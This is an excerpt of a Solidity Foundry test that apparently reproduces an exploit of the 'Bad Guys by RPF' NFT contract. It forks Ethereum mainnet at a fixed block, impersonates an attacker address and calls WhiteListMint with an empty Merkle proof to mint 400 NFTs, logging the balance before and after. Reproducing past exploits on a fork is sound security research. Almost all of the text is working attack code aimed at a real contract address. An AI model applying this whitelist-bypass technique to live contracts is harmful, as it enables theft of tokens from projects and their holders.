...
contract BadGuysbyRPFExploit is DSTest {
    ...
    IBadGuysRPF_ERC721 RPFContract = IBadGuysRPF_ERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    bytes32[] merkleTree;
    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 15460093); //fork mainnet at 15460093 
    ...
    function testExploit() public {
        ...
        console.log("[Before WhiteListMint]Attacker Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));

        cheats.prank(attacker);
        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF 

        console.log("[After WhiteListMint] Attacker Bad Guys by RPF NFT Balance: ", RPFContract.balanceOf(attacker));
